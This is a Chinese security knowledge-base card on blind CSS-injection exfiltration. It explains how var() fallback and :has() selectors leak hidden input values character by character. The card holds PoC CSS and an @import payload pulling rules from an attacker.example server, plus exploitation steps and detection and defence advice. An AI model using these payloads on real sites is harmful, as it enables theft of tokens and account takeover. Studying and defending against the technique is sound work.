---
id: web-generic-xs-leaks-css-custom-property-var-fallback-exfil
title: CSS 自定义属性 + var() 回退做条件请求 gadget：属性选择器命中才外带，隐藏 input 用 :has 父节点
type: scenario
domain: web
path: web/generic/xs-leaks
technique: css-custom-property-var-fallback-exfil
aliases:
- --starts-with-a
- var(--x, none) 外带
- html:has(input[value^=])
- CSS 变量条件请求
- blind-css-exfiltration 工作流
- CSS 注入盲外带
tags:
- web
- css-injection
- xs-leaks
- exfiltration
- custom-property
- has-selector
- hidden-input
- blind-css-exfiltration
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V305
  verified_at: '2026-11-08T11:40:25+08:00'
  notes: 已对照原文核对：HTML 注入 demo（图01-04）、CSS 注入 p{color:red} 与 background-image（图05-06）、input[value=password] 触发 /collectData?value=password（图07-08）、属性选择器着色（图09）、--starts-with-a:url(/startsWithA)+background:var(--starts-with-a,none) 命中请求（图10）、hidden input 失效（图11）、html:has(input[value^=a]) 对 hidden input 生效（图12）、Edge 126.0.2592.68（图13）、blind-css-exfiltration 服务监听 5001（图14）、外带完成 Tag:a/Attribute:href/Value:/（图15）均与正文一致。修正：原文 :not 示例 html:has(...):not(input[name=def]) 的 :not 作用于 html 本身、不能排除内部 def input，已在原理与 PoC 加注说明。路径 web/generic/xs-leaks 存在合法。dedup 与 web-generic-xs-leaks-css-attribute-selector-exfil 为 related（cos 0.9017，同 sink 不同 gadget：var 回退/父节点 :has/@import 工作流），保留两卡；dup-scan 无本篇 pair。未验证点：未在本地复跑靶场与外带服务。无 sources/source_url。
---

## 一句话结论

在 CSS 注入只能写样式、不能执行 JS 时，可以把 `--x: url(/probe)` 定义在属性选择器命中的规则里，再用 `background: var(--x, none)` 统一应用：命中时自定义属性有值、浏览器请求 `/probe`，未命中时 `var()` 回退到 `none`、不发请求；若秘密在隐藏 input 中，则用 `html:has(input[value^="a"])` 在父节点上定义变量，让可见父元素触发请求，配合 `@import` 的 blind-css-exfiltration 服务端即可按轮完成逐字符外带。

## 原理

- **直接 background 的局限**：`input[value^="a"]{background:url(/startsWithA)}` 只有在元素匹配且元素实际渲染背景时才发请求；`input[type=hidden]` 不渲染，即使属性匹配也不会加载图片。
- **自定义属性 + var() 回退**：先在匹配规则里定义变量 `input[value^="a"]{--starts-with-a:url(/startsWithA)}`，再对所有 input 应用 `input{background:var(--starts-with-a,none)}`。CSS 自定义属性会继承/参与级联：只有匹配到 `a` 开头的 input，其 `--starts-with-a` 才有 `url()` 值，`background` 解析为图片 URL 并请求；没有匹配时变量未定义，`var()` 使用回退值 `none`，浏览器不发起任何请求。这样把“条件判断”和“资源加载”解耦，规则更短、默认行为明确。
- **隐藏 input 的父节点方案**：`:has()` 允许父元素根据后代选择器匹配。把条件写在父节点上：`html:has(input[value^="a"]){--starts-with-a:url(/startsWithA)}`，再给可见元素声明 `background:var(--starts-with-a,none)`；隐藏 input 本身不渲染，但父节点 `html` 会继承/使用该变量并渲染背景，从而触发请求。`:not()` 可用于排除特定元素；原文示例 `html:has(input[value^="a"]):not(input[name="def"])` 把 `:not()` 作用在 `html` 上，实际不能排除内部的 `def` input（`html` 本身不是 input），仅作语法示意，构造排除条件时应把 `:not()` 放在被排除的元素/组合上。
- **逐字符爆破与 @import**：每一轮只判断“秘密的下一位是否等于某候选字符”。注入 `<style>@import 'https://attacker/blind-css-exfiltration/start';</style>` 让浏览器从攻击者服务器拉取当轮 CSS；服务器根据已知前缀生成规则，命中则收到唯一回指请求，推进下一位。页面重新加载/被框架化会让 `@import` 重新拉取，形成多轮盲注。
- **为什么能绕过 CSP/净化**：整条链只注入样式，不执行脚本，因此 `script-src` 严格或 DOMPurify 清掉脚本/事件时仍可能成立；但需要 `style-src` 允许内联样式/外部样式，且 `img-src` 允许攻击者域名的图片请求。
- **浏览器支持**：`:has()` 需要较新浏览器（文章测试 Edge 126 / Chromium 内核）；老浏览器可用 Polyfill 或退回非隐藏元素/`:valid` 方案。

## 触发条件

- 存在 CSS 注入点（可插入 `<style>` 或外部样式表），且注入内容会被当作 CSS 解析。
- 秘密位于可被属性选择器匹配的 DOM 属性中（`value`、`href`、`data-*` 等），或能通过 HTML 注入把秘密拼进可匹配属性。
- CSP 允许内联样式/外部样式与攻击者域名的图片请求；或存在其他 oracle。
- 页面可被反复加载/框架化，使 `@import` 按轮重新拉取。
- 隐藏 input 需要 `:has()` 或其它可见性 oracle；浏览器支持对应选择器。

## 利用步骤

1. 确认 CSS 注入点：提交 `p{color:red}` 之类规则观察是否生效；确认 `<style>`/`<link>` 注入方式与 CSP。
2. 用 `--var:url(/probe)` + `background:var(--var,none)` 在本地验证“命中才请求、未命中不请求”。
3. 若秘密在隐藏 input，改用 `html:has(input[value^="<prefix><candidate>"]){--v:url(/probe/<candidate>)}` 在父节点上触发。
4. 部署 blind-css-exfiltration 服务端（`node css-exfiltrator-server.js`，监听 5001），注入 `@import 'https://attacker/blind-css-exfiltration/start'`。
5. 服务端按已知前缀生成当轮候选规则并回传；页面加载后收集回指请求，命中的候选即下一位。
6. 更新前缀、重复，直到还原完整 Token/用户名/链接等；若是 auth token 等敏感值，可进一步 1-click 接管账户。

## PoC

```css
/* 命中才请求，未命中 var() 回退 none */
input[value^="a"] { --starts-with-a: url(/startsWithA); }
input { background: var(--starts-with-a, none); }

/* 隐藏 input：在父节点上定义变量，由可见父节点触发 */
html:has(input[value^="a"]) { --starts-with-a: url(/startsWithA); }
input { background: var(--starts-with-a, none); }

/* 原文示例：:not() 作用在 html 上，不能排除内部 input，仅作语法示意 */
html:has(input[value^="a"]):not(input[name="def"]) { --starts-with-a: url(/startsWithA); }
```

```html
<!-- 注入 @import，服务端按轮下发规则 -->
<style>
  @import 'https://attacker.example/blind-css-exfiltration/start';
</style>
```

```text
盲注流程（与 SQL 布尔盲注类似）：
1. 服务端根据已知前缀生成候选字符规则，例如 prefix "a" 时下发 b/c/... 的 :has 变量规则。
2. 页面加载触发 @import，命中候选的规则发 /probe/<char> 请求。
3. 服务端记录命中的字符，追加到前缀，进入下一轮。
4. 直到读到分隔符/结束标志（如 token 的 "}"），完成外带。
```

## 变体与关联

- 变体：不用自定义属性，直接 `selector{background-image:url(...)}`；缺点是隐藏元素/多元素时难以复用，且默认值需要额外规则。
- 变体：用 `:valid`/`pattern` + `:has()` 做无外部请求的 oracle（帧计数/可见性）；见 `[[web-generic-xs-leaks-css-pattern-valid-frame-counting-token]]`。
- 变体：`@import` 可换成 `<link rel=stylesheet>` 或服务端按轮返回整段 CSS；也可用 `background-image` 的多个候选 URL 一次枚举多位。
- 关联：`[[web-generic-xs-leaks-css-attribute-selector-exfil]]` 是属性选择器 + background-image 的通用原语卡；本卡补充“自定义属性 + var() 回退”的条件请求 gadget、`:has()` 父节点处理隐藏 input 的具体写法，以及 blind-css-exfiltration 的 @import 工作流。
- 关联：`[[web-generic-csrf-rpo-css-selector-side-channel]]`（CSS 选择器窃取 token 的 RPO 组合链）。
- 边界：CSP 禁止内联样式/外部样式、`img-src` 限制攻击者域名、秘密不在可匹配属性、隐藏元素且无 `:has` 支持、payload 长度不足时链不成立；文章的环境为自建 demo + PortSwigger 实验室，实际站点需要特定注入场景。

## 检测与防御

- 检测：页面出现 `<style>`/`<link rel=stylesheet>` 且含 `var(--`、`:has(`、`[value^=`、`background:url(`、`@import`；短时间大量针对同一页面的重新加载/框架化与异常图片请求；请求路径含候选字符/前缀。
- 防御：对用户输入做 HTML 上下文编码与 CSS 白名单，禁止把用户输入当 CSS 解析；CSP `style-src`/`img-src` 严格限制（`style-src 'none'` 或 nonce + 白名单）。
- 加固：敏感数据不放在可被属性选择器匹配的 DOM 属性中；不要把 auth token/CSRF token 明文写进前端页面；对 `@import` 外部样式做来源限制。
- 响应：发现可疑 CSS 外带后，轮换可能泄露的 token/凭据，检查页面注入点与 CSP 配置。
